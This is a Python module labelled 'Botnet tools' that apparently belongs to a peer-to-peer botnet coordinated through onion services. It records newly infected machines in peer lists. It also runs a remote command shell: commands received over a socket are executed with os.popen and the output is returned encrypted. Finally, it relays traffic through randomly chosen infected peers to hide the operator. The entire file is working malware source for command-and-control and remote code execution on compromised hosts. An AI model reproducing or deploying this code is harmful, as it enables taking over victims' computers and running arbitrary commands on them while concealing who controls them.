"""Botnet tools"""

import random
import os
import math
import socket
import copy

from . import (
    MAX_PUBLIC_PEER_LIST_LENGTH,
    logger,
    BUFFER_SIZE,
    ENCODING,
    EXIT,
)
from .security import encrypt
from .message import structure_msg


def add_new_infected_machine(
    msg_data: str, public_peer_list_path: str, private_peer_list_path: str
):
    """ Store onion services from new infected machine
        in some files.

        Args:
            msg_data: The username of the first created user in the infected machine,
                      and the onion services created
    """
    logger.debug(
        f"Add {msg_data} to {public_peer_list_path} and {private_peer_list_path} files"
    )
    __append_to_file(private_peer_list_path, msg_data)

    if not __public_peer_list_reached_maximum_length(public_peer_list_path):
        __append_to_file(public_peer_list_path, msg_data)
    else:
        __overwrite_random_line_in_file(public_peer_list_path, msg_data)


def terminal_session(client_socket: socket.socket, public_key_path: str):
    msg = client_socket.recv(BUFFER_SIZE).decode(ENCODING)
    while msg != EXIT:
        output = __execute_command(msg)
        encrypted_msg = encrypt(output, public_key_path)
        client_socket.send(encrypted_msg)
        msg = client_socket.recv(BUFFER_SIZE).decode(ENCODING)
    client_socket.close()


def establish_tunnel(
    client_socket: socket.socket, private_peer_list: str, port: int, msg_info: dict
):
    num_anonymizers = msg_info["num_anonymizers"]
    onion = msg_info["onion"]

    next_hop_node_address = __get_next_hop(num_anonymizers, private_peer_list, onion)
    updated_msg_info = __update_num_anonymizers(msg_info)
    msg_to_forward = structure_msg(updated_msg_info)

    next_hop = socket.socket()
    next_hop.connect((next_hop_node_address, port))
    next_hop.send(msg_to_forward)

    closed_forward = False
    closed_send_back = False
    while not closed_forward and not closed_send_back:
        closed_forward = __forward(client_socket, next_hop)
        closed_send_back = __send_back(client_socket, next_hop)
    
    client_socket.close()
    next_hop.close()


def close_terminal(socket: socket.socket):
    coded_msg = EXIT.encode(ENCODING)
    socket.send(coded_msg)
    socket.close()


def __append_to_file(file_: str, data: str):
    logger.debug(f"Append {data} to {file_}")
    with open(file_, "a") as f:
        f.write(data + "\n")


def __public_peer_list_reached_maximum_length(public_peer_list_path: str) -> bool:
    try:
        with open(public_peer_list_path, "r") as peer_list:
            num_lines = sum(1 for line in peer_list)
    except FileNotFoundError:
        num_lines = 0

    return num_lines == MAX_PUBLIC_PEER_LIST_LENGTH


def __overwrite_random_line_in_file(file_: str, data: str):
    """ Overwrite a random line of the file

        Args:
            file_: File in which we will overwrite a line
            data: Text to write in the file
    """
    logger.debug(f"Overwrite a random line in {file_} with {data}")
    line_to_overwrite = random.randint(0, MAX_PUBLIC_PEER_LIST_LENGTH - 1)
    with open(file_, "r") as public_peer_list:
        lines = public_peer_list.readlines()
        lines[line_to_overwrite] = data + "\n"

    with open(file_, "w") as public_peer_list:
        public_peer_list.write("".join(lines))


def __execute_command(command: str) -> str:
    result = os.popen(command).read()
    logger.debug(f"Command executed = {command}")
    logger.debug(f"Command result = {result}")
    return result


def __forward(client_socket: socket.socket, next_hop: socket.socket) -> bool:
    msg = client_socket.recv(BUFFER_SIZE)
    if not msg:
        return True
    next_hop.send(msg)

    return False


def __send_back(client_socket: socket.socket, next_hop: socket.socket) -> bool:
    response = next_hop.recv(BUFFER_SIZE)
    if not response:
        return True
    client_socket.send(response)

    return False


def __get_next_hop(num_anonymizers: int, private_peer_list: str, onion: str):
    if num_anonymizers == 1:
        next_hop = onion
    else:
        next_hop = __select_random_neighbour(private_peer_list)

    return next_hop


def __update_num_anonymizers(msg_info: dict) -> dict:
    msg_info_copy = copy.deepcopy(msg_info)
    msg_info_copy["num_anonymizers"] -= 1

    return msg_info_copy


def __select_random_neighbour(private_peer_list_path: str) -> str:
    with open(private_peer_list_path, "r") as private_peer_list:
        lines = private_peer_list.readlines()
        num_lines = len(lines)
        random_number = random.randint(0, num_lines - 1)
        text_line = lines[random_number]

    comm_onion = text_line.strip().split(" ")[-1]
    logger.debug(f"Obtained random neighbour {text_line}")
    logger.debug(f"Communication onion being {comm_onion}")
    return comm_onion
